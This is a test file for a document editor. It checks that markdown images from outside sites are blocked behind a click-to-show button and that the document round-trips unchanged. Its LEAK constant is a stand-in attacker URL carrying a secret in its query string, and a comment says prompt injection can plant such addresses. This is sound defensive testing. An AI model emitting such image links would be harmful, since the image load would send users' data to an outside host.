import { Editor } from '@tiptap/core'
import { describe, expect, it } from 'vitest'
import { editorExtensions } from './editorExtensions'
import { tidyMarkdown } from './markdown'

// refactor/BUGS.md sec-4: an image address can carry data a prompt injection put into it.
const LEAK = 'https://attacker.example/pixel.png?q=secret'

describe('images from other sites in the document editor', () => {
  it('in the document editor, shows a button and keeps the document as it was', () => {
    const markdown = `Before\n\n![chart](${LEAK})\n\n![mine](/api/files/download?path=a.png)\n`
    const editor = new Editor({ extensions: editorExtensions, content: markdown, contentType: 'markdown' })
    const images = [...editor.view.dom.querySelectorAll('img')].map((i) => i.getAttribute('src'))
    expect(images).toEqual(['/api/files/download?path=a.png'])
    const button = editor.view.dom.querySelector('button')
    expect(button?.textContent).toBe('chart: show image from attacker.example')
    button?.click()
    expect(editor.view.dom.querySelector(`img[src="${LEAK}"]`)).not.toBeNull()
    expect(tidyMarkdown(editor.getMarkdown())).toBe(tidyMarkdown(markdown))
    editor.destroy()
  })
})
